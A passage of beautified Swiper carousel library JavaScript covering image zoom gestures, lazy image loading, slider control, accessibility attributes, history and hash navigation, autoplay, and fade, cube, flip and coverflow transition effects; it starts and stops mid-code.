                s.isMoved || (s.width = i.$imageEl[0].offsetWidth, s.height = i.$imageEl[0].offsetHeight, s.startX = n.getTranslate(i.$imageWrapEl[0], "x") || 0, s.startY = n.getTranslate(i.$imageWrapEl[0], "y") || 0, i.slideWidth = i.$slideEl[0].offsetWidth, i.slideHeight = i.$slideEl[0].offsetHeight, i.$imageWrapEl.transition(0), this.rtl && (s.startX = -s.startX, s.startY = -s.startY));
                var r = s.width * t.scale,
                  o = s.height * t.scale;
                if (!(r < i.slideWidth && o < i.slideHeight)) {
                  if (s.minX = Math.min(i.slideWidth / 2 - r / 2, 0), s.maxX = -s.minX, s.minY = Math.min(i.slideHeight / 2 - o / 2, 0), s.maxY = -s.minY, s.touchesCurrent.x = "touchmove" === e.type ? e.targetTouches[0].pageX : e.pageX, s.touchesCurrent.y = "touchmove" === e.type ? e.targetTouches[0].pageY : e.pageY, !s.isMoved && !t.isScaling) {
                    if (this.isHorizontal() && (Math.floor(s.minX) === Math.floor(s.startX) && s.touchesCurrent.x < s.touchesStart.x || Math.floor(s.maxX) === Math.floor(s.startX) && s.touchesCurrent.x > s.touchesStart.x)) return void (s.isTouched = !1);
                    if (!this.isHorizontal() && (Math.floor(s.minY) === Math.floor(s.startY) && s.touchesCurrent.y < s.touchesStart.y || Math.floor(s.maxY) === Math.floor(s.startY) && s.touchesCurrent.y > s.touchesStart.y)) return void (s.isTouched = !1);
                  }
                  e.preventDefault(), e.stopPropagation(), s.isMoved = !0, s.currentX = s.touchesCurrent.x - s.touchesStart.x + s.startX, s.currentY = s.touchesCurrent.y - s.touchesStart.y + s.startY, s.currentX < s.minX && (s.currentX = s.minX + 1 - Math.pow(s.minX - s.currentX + 1, .8)), s.currentX > s.maxX && (s.currentX = s.maxX - 1 + Math.pow(s.currentX - s.maxX + 1, .8)), s.currentY < s.minY && (s.currentY = s.minY + 1 - Math.pow(s.minY - s.currentY + 1, .8)), s.currentY > s.maxY && (s.currentY = s.maxY - 1 + Math.pow(s.currentY - s.maxY + 1, .8)), a.prevPositionX || (a.prevPositionX = s.touchesCurrent.x), a.prevPositionY || (a.prevPositionY = s.touchesCurrent.y), a.prevTime || (a.prevTime = Date.now()), a.x = (s.touchesCurrent.x - a.prevPositionX) / (Date.now() - a.prevTime) / 2, a.y = (s.touchesCurrent.y - a.prevPositionY) / (Date.now() - a.prevTime) / 2, Math.abs(s.touchesCurrent.x - a.prevPositionX) < 2 && (a.x = 0), Math.abs(s.touchesCurrent.y - a.prevPositionY) < 2 && (a.y = 0), a.prevPositionX = s.touchesCurrent.x, a.prevPositionY = s.touchesCurrent.y, a.prevTime = Date.now(), i.$imageWrapEl.transform("translate3d(" + s.currentX + "px, " + s.currentY + "px,0)");
                }
              }
            },
            onTouchEnd: function onTouchEnd() {
              var e = this.zoom,
                t = e.gesture,
                i = e.image,
                s = e.velocity;
              if (t.$imageEl && 0 !== t.$imageEl.length) {
                if (!i.isTouched || !i.isMoved) return i.isTouched = !1, void (i.isMoved = !1);
                i.isTouched = !1, i.isMoved = !1;
                var a = 300,
                  r = 300,
                  n = s.x * a,
                  o = i.currentX + n,
                  l = s.y * r,
                  d = i.currentY + l;
                0 !== s.x && (a = Math.abs((o - i.currentX) / s.x)), 0 !== s.y && (r = Math.abs((d - i.currentY) / s.y));
                var h = Math.max(a, r);
                i.currentX = o, i.currentY = d;
                var p = i.width * e.scale,
                  c = i.height * e.scale;
                i.minX = Math.min(t.slideWidth / 2 - p / 2, 0), i.maxX = -i.minX, i.minY = Math.min(t.slideHeight / 2 - c / 2, 0), i.maxY = -i.minY, i.currentX = Math.max(Math.min(i.currentX, i.maxX), i.minX), i.currentY = Math.max(Math.min(i.currentY, i.maxY), i.minY), t.$imageWrapEl.transition(h).transform("translate3d(" + i.currentX + "px, " + i.currentY + "px,0)");
              }
            },
            onTransitionEnd: function onTransitionEnd() {
              var e = this.zoom,
                t = e.gesture;
              t.$slideEl && this.previousIndex !== this.activeIndex && (t.$imageEl.transform("translate3d(0,0,0) scale(1)"), t.$imageWrapEl.transform("translate3d(0,0,0)"), e.scale = 1, e.currentScale = 1, t.$slideEl = void 0, t.$imageEl = void 0, t.$imageWrapEl = void 0);
            },
            toggle: function toggle(e) {
              var t = this.zoom;
              t.scale && 1 !== t.scale ? t.out() : t.in(e);
            },
            in: function _in(e) {
              var t,
                i,
                a,
                r,
                n,
                o,
                l,
                d,
                h,
                p,
                c,
                u,
                v,
                f,
                m,
                g,
                b = this.zoom,
                w = this.params.zoom,
                y = b.gesture,
                x = b.image;
              (y.$slideEl || (y.$slideEl = this.clickedSlide ? s(this.clickedSlide) : this.slides.eq(this.activeIndex), y.$imageEl = y.$slideEl.find("img, svg, canvas"), y.$imageWrapEl = y.$imageEl.parent("." + w.containerClass)), y.$imageEl && 0 !== y.$imageEl.length) && (y.$slideEl.addClass("" + w.zoomedSlideClass), void 0 === x.touchesStart.x && e ? (t = "touchend" === e.type ? e.changedTouches[0].pageX : e.pageX, i = "touchend" === e.type ? e.changedTouches[0].pageY : e.pageY) : (t = x.touchesStart.x, i = x.touchesStart.y), b.scale = y.$imageWrapEl.attr("data-swiper-zoom") || w.maxRatio, b.currentScale = y.$imageWrapEl.attr("data-swiper-zoom") || w.maxRatio, e ? (m = y.$slideEl[0].offsetWidth, g = y.$slideEl[0].offsetHeight, a = y.$slideEl.offset().left + m / 2 - t, r = y.$slideEl.offset().top + g / 2 - i, l = y.$imageEl[0].offsetWidth, d = y.$imageEl[0].offsetHeight, h = l * b.scale, p = d * b.scale, v = -(c = Math.min(m / 2 - h / 2, 0)), f = -(u = Math.min(g / 2 - p / 2, 0)), (n = a * b.scale) < c && (n = c), n > v && (n = v), (o = r * b.scale) < u && (o = u), o > f && (o = f)) : (n = 0, o = 0), y.$imageWrapEl.transition(300).transform("translate3d(" + n + "px, " + o + "px,0)"), y.$imageEl.transition(300).transform("translate3d(0,0,0) scale(" + b.scale + ")"));
            },
            out: function out() {
              var e = this.zoom,
                t = this.params.zoom,
                i = e.gesture;
              i.$slideEl || (i.$slideEl = this.clickedSlide ? s(this.clickedSlide) : this.slides.eq(this.activeIndex), i.$imageEl = i.$slideEl.find("img, svg, canvas"), i.$imageWrapEl = i.$imageEl.parent("." + t.containerClass)), i.$imageEl && 0 !== i.$imageEl.length && (e.scale = 1, e.currentScale = 1, i.$imageWrapEl.transition(300).transform("translate3d(0,0,0)"), i.$imageEl.transition(300).transform("translate3d(0,0,0) scale(1)"), i.$slideEl.removeClass("" + t.zoomedSlideClass), i.$slideEl = void 0);
            },
            enable: function enable() {
              var e = this.zoom;
              if (!e.enabled) {
                e.enabled = !0;
                var t = !("touchstart" !== this.touchEvents.start || !o.passiveListener || !this.params.passiveListeners) && {
                    passive: !0,
                    capture: !1
                  },
                  i = !o.passiveListener || {
                    passive: !1,
                    capture: !0
                  };
                o.gestures ? (this.$wrapperEl.on("gesturestart", ".swiper-slide", e.onGestureStart, t), this.$wrapperEl.on("gesturechange", ".swiper-slide", e.onGestureChange, t), this.$wrapperEl.on("gestureend", ".swiper-slide", e.onGestureEnd, t)) : "touchstart" === this.touchEvents.start && (this.$wrapperEl.on(this.touchEvents.start, ".swiper-slide", e.onGestureStart, t), this.$wrapperEl.on(this.touchEvents.move, ".swiper-slide", e.onGestureChange, i), this.$wrapperEl.on(this.touchEvents.end, ".swiper-slide", e.onGestureEnd, t), this.touchEvents.cancel && this.$wrapperEl.on(this.touchEvents.cancel, ".swiper-slide", e.onGestureEnd, t)), this.$wrapperEl.on(this.touchEvents.move, "." + this.params.zoom.containerClass, e.onTouchMove, i);
              }
            },
            disable: function disable() {
              var e = this.zoom;
              if (e.enabled) {
                this.zoom.enabled = !1;
                var t = !("touchstart" !== this.touchEvents.start || !o.passiveListener || !this.params.passiveListeners) && {
                    passive: !0,
                    capture: !1
                  },
                  i = !o.passiveListener || {
                    passive: !1,
                    capture: !0
                  };
                o.gestures ? (this.$wrapperEl.off("gesturestart", ".swiper-slide", e.onGestureStart, t), this.$wrapperEl.off("gesturechange", ".swiper-slide", e.onGestureChange, t), this.$wrapperEl.off("gestureend", ".swiper-slide", e.onGestureEnd, t)) : "touchstart" === this.touchEvents.start && (this.$wrapperEl.off(this.touchEvents.start, ".swiper-slide", e.onGestureStart, t), this.$wrapperEl.off(this.touchEvents.move, ".swiper-slide", e.onGestureChange, i), this.$wrapperEl.off(this.touchEvents.end, ".swiper-slide", e.onGestureEnd, t), this.touchEvents.cancel && this.$wrapperEl.off(this.touchEvents.cancel, ".swiper-slide", e.onGestureEnd, t)), this.$wrapperEl.off(this.touchEvents.move, "." + this.params.zoom.containerClass, e.onTouchMove, i);
              }
            }
          },
          le = {
            loadInSlide: function loadInSlide(e, t) {
              void 0 === t && (t = !0);
              var i = this,
                a = i.params.lazy;
              if (void 0 !== e && 0 !== i.slides.length) {
                var r = i.virtual && i.params.virtual.enabled ? i.$wrapperEl.children("." + i.params.slideClass + '[data-swiper-slide-index="' + e + '"]') : i.slides.eq(e),
                  n = r.find("." + a.elementClass + ":not(." + a.loadedClass + "):not(." + a.loadingClass + ")");
                !r.hasClass(a.elementClass) || r.hasClass(a.loadedClass) || r.hasClass(a.loadingClass) || (n = n.add(r[0])), 0 !== n.length && n.each(function (e, n) {
                  var o = s(n);
                  o.addClass(a.loadingClass);
                  var l = o.attr("data-background"),
                    d = o.attr("data-src"),
                    h = o.attr("data-srcset"),
                    p = o.attr("data-sizes");
                  i.loadImage(o[0], d || l, h, p, !1, function () {
                    if (null != i && i && (!i || i.params) && !i.destroyed) {
                      if (l ? (o.css("background-image", 'url("' + l + '")'), o.removeAttr("data-background")) : (h && (o.attr("srcset", h), o.removeAttr("data-srcset")), p && (o.attr("sizes", p), o.removeAttr("data-sizes")), d && (o.attr("src", d), o.removeAttr("data-src"))), o.addClass(a.loadedClass).removeClass(a.loadingClass), r.find("." + a.preloaderClass).remove(), i.params.loop && t) {
                        var e = r.attr("data-swiper-slide-index");
                        if (r.hasClass(i.params.slideDuplicateClass)) {
                          var s = i.$wrapperEl.children('[data-swiper-slide-index="' + e + '"]:not(.' + i.params.slideDuplicateClass + ")");
                          i.lazy.loadInSlide(s.index(), !1);
                        } else {
                          var n = i.$wrapperEl.children("." + i.params.slideDuplicateClass + '[data-swiper-slide-index="' + e + '"]');
                          i.lazy.loadInSlide(n.index(), !1);
                        }
                      }
                      i.emit("lazyImageReady", r[0], o[0]);
                    }
                  }), i.emit("lazyImageLoad", r[0], o[0]);
                });
              }
            },
            load: function load() {
              var e = this,
                t = e.$wrapperEl,
                i = e.params,
                a = e.slides,
                r = e.activeIndex,
                n = e.virtual && i.virtual.enabled,
                o = i.lazy,
                l = i.slidesPerView;
              function d(e) {
                if (n) {
                  if (t.children("." + i.slideClass + '[data-swiper-slide-index="' + e + '"]').length) return !0;
                } else if (a[e]) return !0;
                return !1;
              }
              function h(e) {
                return n ? s(e).attr("data-swiper-slide-index") : s(e).index();
              }
              if ("auto" === l && (l = 0), e.lazy.initialImageLoaded || (e.lazy.initialImageLoaded = !0), e.params.watchSlidesVisibility) t.children("." + i.slideVisibleClass).each(function (t, i) {
                var a = n ? s(i).attr("data-swiper-slide-index") : s(i).index();
                e.lazy.loadInSlide(a);
              });else if (l > 1) for (var p = r; p < r + l; p += 1) d(p) && e.lazy.loadInSlide(p);else e.lazy.loadInSlide(r);
              if (o.loadPrevNext) if (l > 1 || o.loadPrevNextAmount && o.loadPrevNextAmount > 1) {
                for (var c = o.loadPrevNextAmount, u = l, v = Math.min(r + u + Math.max(c, u), a.length), f = Math.max(r - Math.max(u, c), 0), m = r + l; m < v; m += 1) d(m) && e.lazy.loadInSlide(m);
                for (var g = f; g < r; g += 1) d(g) && e.lazy.loadInSlide(g);
              } else {
                var b = t.children("." + i.slideNextClass);
                b.length > 0 && e.lazy.loadInSlide(h(b));
                var w = t.children("." + i.slidePrevClass);
                w.length > 0 && e.lazy.loadInSlide(h(w));
              }
            }
          },
          de = {
            LinearSpline: function LinearSpline(e, t) {
              var i,
                s,
                a,
                r,
                n,
                o = function o(e, t) {
                  for (s = -1, i = e.length; i - s > 1;) e[a = i + s >> 1] <= t ? s = a : i = a;
                  return i;
                };
              return this.x = e, this.y = t, this.lastIndex = e.length - 1, this.interpolate = function (e) {
                return e ? (n = o(this.x, e), r = n - 1, (e - this.x[r]) * (this.y[n] - this.y[r]) / (this.x[n] - this.x[r]) + this.y[r]) : 0;
              }, this;
            },
            getInterpolateFunction: function getInterpolateFunction(e) {
              this.controller.spline || (this.controller.spline = this.params.loop ? new de.LinearSpline(this.slidesGrid, e.slidesGrid) : new de.LinearSpline(this.snapGrid, e.snapGrid));
            },
            setTranslate: function setTranslate(e, t) {
              var i,
                s,
                a = this,
                r = a.controller.control;
              function n(e) {
                var t = a.rtlTranslate ? -a.translate : a.translate;
                "slide" === a.params.controller.by && (a.controller.getInterpolateFunction(e), s = -a.controller.spline.interpolate(-t)), s && "container" !== a.params.controller.by || (i = (e.maxTranslate() - e.minTranslate()) / (a.maxTranslate() - a.minTranslate()), s = (t - a.minTranslate()) * i + e.minTranslate()), a.params.controller.inverse && (s = e.maxTranslate() - s), e.updateProgress(s), e.setTranslate(s, a), e.updateActiveIndex(), e.updateSlidesClasses();
              }
              if (Array.isArray(r)) for (var o = 0; o < r.length; o += 1) r[o] !== t && r[o] instanceof W && n(r[o]);else r instanceof W && t !== r && n(r);
            },
            setTransition: function setTransition(e, t) {
              var i,
                s = this,
                a = s.controller.control;
              function r(t) {
                t.setTransition(e, s), 0 !== e && (t.transitionStart(), t.params.autoHeight && n.nextTick(function () {
                  t.updateAutoHeight();
                }), t.$wrapperEl.transitionEnd(function () {
                  a && (t.params.loop && "slide" === s.params.controller.by && t.loopFix(), t.transitionEnd());
                }));
              }
              if (Array.isArray(a)) for (i = 0; i < a.length; i += 1) a[i] !== t && a[i] instanceof W && r(a[i]);else a instanceof W && t !== a && r(a);
            }
          },
          he = {
            makeElFocusable: function makeElFocusable(e) {
              return e.attr("tabIndex", "0"), e;
            },
            addElRole: function addElRole(e, t) {
              return e.attr("role", t), e;
            },
            addElLabel: function addElLabel(e, t) {
              return e.attr("aria-label", t), e;
            },
            disableEl: function disableEl(e) {
              return e.attr("aria-disabled", !0), e;
            },
            enableEl: function enableEl(e) {
              return e.attr("aria-disabled", !1), e;
            },
            onEnterKey: function onEnterKey(e) {
              var t = this.params.a11y;
              if (13 === e.keyCode) {
                var i = s(e.target);
                this.navigation && this.navigation.$nextEl && i.is(this.navigation.$nextEl) && (this.isEnd && !this.params.loop || this.slideNext(), this.isEnd ? this.a11y.notify(t.lastSlideMessage) : this.a11y.notify(t.nextSlideMessage)), this.navigation && this.navigation.$prevEl && i.is(this.navigation.$prevEl) && (this.isBeginning && !this.params.loop || this.slidePrev(), this.isBeginning ? this.a11y.notify(t.firstSlideMessage) : this.a11y.notify(t.prevSlideMessage)), this.pagination && i.is("." + this.params.pagination.bulletClass) && i[0].click();
              }
            },
            notify: function notify(e) {
              var t = this.a11y.liveRegion;
              0 !== t.length && (t.html(""), t.html(e));
            },
            updateNavigation: function updateNavigation() {
              if (!this.params.loop && this.navigation) {
                var e = this.navigation,
                  t = e.$nextEl,
                  i = e.$prevEl;
                i && i.length > 0 && (this.isBeginning ? this.a11y.disableEl(i) : this.a11y.enableEl(i)), t && t.length > 0 && (this.isEnd ? this.a11y.disableEl(t) : this.a11y.enableEl(t));
              }
            },
            updatePagination: function updatePagination() {
              var e = this,
                t = e.params.a11y;
              e.pagination && e.params.pagination.clickable && e.pagination.bullets && e.pagination.bullets.length && e.pagination.bullets.each(function (i, a) {
                var r = s(a);
                e.a11y.makeElFocusable(r), e.a11y.addElRole(r, "button"), e.a11y.addElLabel(r, t.paginationBulletMessage.replace(/{{index}}/, r.index() + 1));
              });
            },
            init: function init() {
              this.$el.append(this.a11y.liveRegion);
              var e,
                t,
                i = this.params.a11y;
              this.navigation && this.navigation.$nextEl && (e = this.navigation.$nextEl), this.navigation && this.navigation.$prevEl && (t = this.navigation.$prevEl), e && (this.a11y.makeElFocusable(e), this.a11y.addElRole(e, "button"), this.a11y.addElLabel(e, i.nextSlideMessage), e.on("keydown", this.a11y.onEnterKey)), t && (this.a11y.makeElFocusable(t), this.a11y.addElRole(t, "button"), this.a11y.addElLabel(t, i.prevSlideMessage), t.on("keydown", this.a11y.onEnterKey)), this.pagination && this.params.pagination.clickable && this.pagination.bullets && this.pagination.bullets.length && this.pagination.$el.on("keydown", "." + this.params.pagination.bulletClass, this.a11y.onEnterKey);
            },
            destroy: function destroy() {
              var e, t;
              this.a11y.liveRegion && this.a11y.liveRegion.length > 0 && this.a11y.liveRegion.remove(), this.navigation && this.navigation.$nextEl && (e = this.navigation.$nextEl), this.navigation && this.navigation.$prevEl && (t = this.navigation.$prevEl), e && e.off("keydown", this.a11y.onEnterKey), t && t.off("keydown", this.a11y.onEnterKey), this.pagination && this.params.pagination.clickable && this.pagination.bullets && this.pagination.bullets.length && this.pagination.$el.off("keydown", "." + this.params.pagination.bulletClass, this.a11y.onEnterKey);
            }
          },
          pe = {
            init: function init() {
              if (this.params.history) {
                if (!t.history || !t.history.pushState) return this.params.history.enabled = !1, void (this.params.hashNavigation.enabled = !0);
                var e = this.history;
                e.initialized = !0, e.paths = pe.getPathValues(), (e.paths.key || e.paths.value) && (e.scrollToSlide(0, e.paths.value, this.params.runCallbacksOnInit), this.params.history.replaceState || t.addEventListener("popstate", this.history.setHistoryPopState));
              }
            },
            destroy: function destroy() {
              this.params.history.replaceState || t.removeEventListener("popstate", this.history.setHistoryPopState);
            },
            setHistoryPopState: function setHistoryPopState() {
              this.history.paths = pe.getPathValues(), this.history.scrollToSlide(this.params.speed, this.history.paths.value, !1);
            },
            getPathValues: function getPathValues() {
              var e = t.location.pathname.slice(1).split("/").filter(function (e) {
                  return "" !== e;
                }),
                i = e.length;
              return {
                key: e[i - 2],
                value: e[i - 1]
              };
            },
            setHistory: function setHistory(e, i) {
              if (this.history.initialized && this.params.history.enabled) {
                var s = this.slides.eq(i),
                  a = pe.slugify(s.attr("data-history"));
                t.location.pathname.includes(e) || (a = e + "/" + a);
                var r = t.history.state;
                r && r.value === a || (this.params.history.replaceState ? t.history.replaceState({
                  value: a
                }, null, a) : t.history.pushState({
                  value: a
                }, null, a));
              }
            },
            slugify: function slugify(e) {
              return e.toString().replace(/\s+/g, "-").replace(/[^\w-]+/g, "").replace(/--+/g, "-").replace(/^-+/, "").replace(/-+$/, "");
            },
            scrollToSlide: function scrollToSlide(e, t, i) {
              if (t) for (var s = 0, a = this.slides.length; s < a; s += 1) {
                var r = this.slides.eq(s);
                if (pe.slugify(r.attr("data-history")) === t && !r.hasClass(this.params.slideDuplicateClass)) {
                  var n = r.index();
                  this.slideTo(n, e, i);
                }
              } else this.slideTo(0, e, i);
            }
          },
          ce = {
            onHashCange: function onHashCange() {
              var t = e.location.hash.replace("#", "");
              if (t !== this.slides.eq(this.activeIndex).attr("data-hash")) {
                var i = this.$wrapperEl.children("." + this.params.slideClass + '[data-hash="' + t + '"]').index();
                if (void 0 === i) return;
                this.slideTo(i);
              }
            },
            setHash: function setHash() {
              if (this.hashNavigation.initialized && this.params.hashNavigation.enabled) if (this.params.hashNavigation.replaceState && t.history && t.history.replaceState) t.history.replaceState(null, null, "#" + this.slides.eq(this.activeIndex).attr("data-hash") || false);else {
                var i = this.slides.eq(this.activeIndex),
                  s = i.attr("data-hash") || i.attr("data-history");
                e.location.hash = s || "";
              }
            },
            init: function init() {
              if (!(!this.params.hashNavigation.enabled || this.params.history && this.params.history.enabled)) {
                this.hashNavigation.initialized = !0;
                var i = e.location.hash.replace("#", "");
                if (i) for (var a = 0, r = this.slides.length; a < r; a += 1) {
                  var n = this.slides.eq(a);
                  if ((n.attr("data-hash") || n.attr("data-history")) === i && !n.hasClass(this.params.slideDuplicateClass)) {
                    var o = n.index();
                    this.slideTo(o, 0, this.params.runCallbacksOnInit, !0);
                  }
                }
                this.params.hashNavigation.watchState && s(t).on("hashchange", this.hashNavigation.onHashCange);
              }
            },
            destroy: function destroy() {
              this.params.hashNavigation.watchState && s(t).off("hashchange", this.hashNavigation.onHashCange);
            }
          },
          ue = {
            run: function run() {
              var e = this,
                t = e.slides.eq(e.activeIndex),
                i = e.params.autoplay.delay;
              t.attr("data-swiper-autoplay") && (i = t.attr("data-swiper-autoplay") || e.params.autoplay.delay), clearTimeout(e.autoplay.timeout), e.autoplay.timeout = n.nextTick(function () {
                e.params.autoplay.reverseDirection ? e.params.loop ? (e.loopFix(), e.slidePrev(e.params.speed, !0, !0), e.emit("autoplay")) : e.isBeginning ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(e.slides.length - 1, e.params.speed, !0, !0), e.emit("autoplay")) : (e.slidePrev(e.params.speed, !0, !0), e.emit("autoplay")) : e.params.loop ? (e.loopFix(), e.slideNext(e.params.speed, !0, !0), e.emit("autoplay")) : e.isEnd ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(0, e.params.speed, !0, !0), e.emit("autoplay")) : (e.slideNext(e.params.speed, !0, !0), e.emit("autoplay")), e.params.cssMode && e.autoplay.running && e.autoplay.run();
              }, i);
            },
            start: function start() {
              return void 0 === this.autoplay.timeout && !this.autoplay.running && (this.autoplay.running = !0, this.emit("autoplayStart"), this.autoplay.run(), !0);
            },
            stop: function stop() {
              return !!this.autoplay.running && void 0 !== this.autoplay.timeout && (this.autoplay.timeout && (clearTimeout(this.autoplay.timeout), this.autoplay.timeout = void 0), this.autoplay.running = !1, this.emit("autoplayStop"), !0);
            },
            pause: function pause(e) {
              this.autoplay.running && (this.autoplay.paused || (this.autoplay.timeout && clearTimeout(this.autoplay.timeout), this.autoplay.paused = !0, 0 !== e && this.params.autoplay.waitForTransition ? (this.$wrapperEl[0].addEventListener("transitionend", this.autoplay.onTransitionEnd), this.$wrapperEl[0].addEventListener("webkitTransitionEnd", this.autoplay.onTransitionEnd)) : (this.autoplay.paused = !1, this.autoplay.run())));
            }
          },
          ve = {
            setTranslate: function setTranslate() {
              for (var e = this.slides, t = 0; t < e.length; t += 1) {
                var i = this.slides.eq(t),
                  s = -i[0].swiperSlideOffset;
                this.params.virtualTranslate || (s -= this.translate);
                var a = 0;
                this.isHorizontal() || (a = s, s = 0);
                var r = this.params.fadeEffect.crossFade ? Math.max(1 - Math.abs(i[0].progress), 0) : 1 + Math.min(Math.max(i[0].progress, -1), 0);
                i.css({
                  opacity: r
                }).transform("translate3d(" + s + "px, " + a + "px, 0px)");
              }
            },
            setTransition: function setTransition(e) {
              var t = this,
                i = t.slides,
                s = t.$wrapperEl;
              if (i.transition(e), t.params.virtualTranslate && 0 !== e) {
                var a = !1;
                i.transitionEnd(function () {
                  if (!a && t && !t.destroyed) {
                    a = !0, t.animating = !1;
                    for (var e = ["webkitTransitionEnd", "transitionend"], i = 0; i < e.length; i += 1) s.trigger(e[i]);
                  }
                });
              }
            }
          },
          fe = {
            setTranslate: function setTranslate() {
              var e,
                t = this.$el,
                i = this.$wrapperEl,
                a = this.slides,
                r = this.width,
                n = this.height,
                o = this.rtlTranslate,
                l = this.size,
                d = this.params.cubeEffect,
                h = this.isHorizontal(),
                p = this.virtual && this.params.virtual.enabled,
                c = 0;
              d.shadow && (h ? (0 === (e = i.find(".swiper-cube-shadow")).length && (e = s('<div class="swiper-cube-shadow"></div>'), i.append(e)), e.css({
                height: r + "px"
              })) : 0 === (e = t.find(".swiper-cube-shadow")).length && (e = s('<div class="swiper-cube-shadow"></div>'), t.append(e)));
              for (var u = 0; u < a.length; u += 1) {
                var v = a.eq(u),
                  f = u;
                p && (f = parseInt(v.attr("data-swiper-slide-index"), 10));
                var m = 90 * f,
                  g = Math.floor(m / 360);
                o && (m = -m, g = Math.floor(-m / 360));
                var b = Math.max(Math.min(v[0].progress, 1), -1),
                  w = 0,
                  y = 0,
                  x = 0;
                f % 4 == 0 ? (w = 4 * -g * l, x = 0) : (f - 1) % 4 == 0 ? (w = 0, x = 4 * -g * l) : (f - 2) % 4 == 0 ? (w = l + 4 * g * l, x = l) : (f - 3) % 4 == 0 && (w = -l, x = 3 * l + 4 * l * g), o && (w = -w), h || (y = w, w = 0);
                var T = "rotateX(" + (h ? 0 : -m) + "deg) rotateY(" + (h ? m : 0) + "deg) translate3d(" + w + "px, " + y + "px, " + x + "px)";
                if (b <= 1 && b > -1 && (c = 90 * f + 90 * b, o && (c = 90 * -f - 90 * b)), v.transform(T), d.slideShadows) {
                  var E = h ? v.find(".swiper-slide-shadow-left") : v.find(".swiper-slide-shadow-top"),
                    S = h ? v.find(".swiper-slide-shadow-right") : v.find(".swiper-slide-shadow-bottom");
                  0 === E.length && (E = s('<div class="swiper-slide-shadow-' + (h ? "left" : "top") + '"></div>'), v.append(E)), 0 === S.length && (S = s('<div class="swiper-slide-shadow-' + (h ? "right" : "bottom") + '"></div>'), v.append(S)), E.length && (E[0].style.opacity = Math.max(-b, 0)), S.length && (S[0].style.opacity = Math.max(b, 0));
                }
              }
              if (i.css({
                "-webkit-transform-origin": "50% 50% -" + l / 2 + "px",
                "-moz-transform-origin": "50% 50% -" + l / 2 + "px",
                "-ms-transform-origin": "50% 50% -" + l / 2 + "px",
                "transform-origin": "50% 50% -" + l / 2 + "px"
              }), d.shadow) if (h) e.transform("translate3d(0px, " + (r / 2 + d.shadowOffset) + "px, " + -r / 2 + "px) rotateX(90deg) rotateZ(0deg) scale(" + d.shadowScale + ")");else {
                var C = Math.abs(c) - 90 * Math.floor(Math.abs(c) / 90),
                  M = 1.5 - (Math.sin(2 * C * Math.PI / 360) / 2 + Math.cos(2 * C * Math.PI / 360) / 2),
                  P = d.shadowScale,
                  z = d.shadowScale / M,
                  k = d.shadowOffset;
                e.transform("scale3d(" + P + ", 1, " + z + ") translate3d(0px, " + (n / 2 + k) + "px, " + -n / 2 / z + "px) rotateX(-90deg)");
              }
              var $ = j.isSafari || j.isUiWebView ? -l / 2 : 0;
              i.transform("translate3d(0px,0," + $ + "px) rotateX(" + (this.isHorizontal() ? 0 : c) + "deg) rotateY(" + (this.isHorizontal() ? -c : 0) + "deg)");
            },
            setTransition: function setTransition(e) {
              var t = this.$el;
              this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), this.params.cubeEffect.shadow && !this.isHorizontal() && t.find(".swiper-cube-shadow").transition(e);
            }
          },
          me = {
            setTranslate: function setTranslate() {
              for (var e = this.slides, t = this.rtlTranslate, i = 0; i < e.length; i += 1) {
                var a = e.eq(i),
                  r = a[0].progress;
                this.params.flipEffect.limitRotation && (r = Math.max(Math.min(a[0].progress, 1), -1));
                var n = -180 * r,
                  o = 0,
                  l = -a[0].swiperSlideOffset,
                  d = 0;
                if (this.isHorizontal() ? t && (n = -n) : (d = l, l = 0, o = -n, n = 0), a[0].style.zIndex = -Math.abs(Math.round(r)) + e.length, this.params.flipEffect.slideShadows) {
                  var h = this.isHorizontal() ? a.find(".swiper-slide-shadow-left") : a.find(".swiper-slide-shadow-top"),
                    p = this.isHorizontal() ? a.find(".swiper-slide-shadow-right") : a.find(".swiper-slide-shadow-bottom");
                  0 === h.length && (h = s('<div class="swiper-slide-shadow-' + (this.isHorizontal() ? "left" : "top") + '"></div>'), a.append(h)), 0 === p.length && (p = s('<div class="swiper-slide-shadow-' + (this.isHorizontal() ? "right" : "bottom") + '"></div>'), a.append(p)), h.length && (h[0].style.opacity = Math.max(-r, 0)), p.length && (p[0].style.opacity = Math.max(r, 0));
                }
                a.transform("translate3d(" + l + "px, " + d + "px, 0px) rotateX(" + o + "deg) rotateY(" + n + "deg)");
              }
            },
            setTransition: function setTransition(e) {
              var t = this,
                i = t.slides,
                s = t.activeIndex,
                a = t.$wrapperEl;
              if (i.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), t.params.virtualTranslate && 0 !== e) {
                var r = !1;
                i.eq(s).transitionEnd(function () {
                  if (!r && t && !t.destroyed) {
                    r = !0, t.animating = !1;
                    for (var e = ["webkitTransitionEnd", "transitionend"], i = 0; i < e.length; i += 1) a.trigger(e[i]);
                  }
                });
              }
            }
          },
          ge = {
            setTranslate: function setTranslate() {
              for (var e = this.width, t = this.height, i = this.slides, a = this.$wrapperEl, r = this.slidesSizesGrid, n = this.params.coverflowEffect, l = this.isHorizontal(), d = this.translate, h = l ? e / 2 - d : t / 2 - d, p = l ? n.rotate : -n.rotate, c = n.depth, u = 0, v = i.length; u < v; u += 1) {
                var f = i.eq(u),
                  m = r[u],
                  g = (h - f[0].swiperSlideOffset - m / 2) / m * n.modifier,
                  b = l ? p * g : 0,
                  w = l ? 0 : p * g,
                  y = -c * Math.abs(g),
                  x = l ? 0 : n.stretch * g,
                  T = l ? n.stretch * g : 0;
                Math.abs(T) < .001 && (T = 0), Math.abs(x) < .001 && (x = 0), Math.abs(y) < .001 && (y = 0), Math.abs(b) < .001 && (b = 0), Math.abs(w) < .001 && (w = 0);
                var E = "translate3d(" + T + "px," + x + "px," + y + "px)  rotateX(" + w + "deg) rotateY(" + b + "deg)";
                if (f.transform(E), f[0].style.zIndex = 1 - Math.abs(Math.round(g)), n.slideShadows) {
                  var S = l ? f.find(".swiper-slide-shadow-left") : f.find(".swiper-slide-shadow-top"),
                    C = l ? f.find(".swiper-slide-shadow-right") : f.find(".swiper-slide-shadow-bottom");
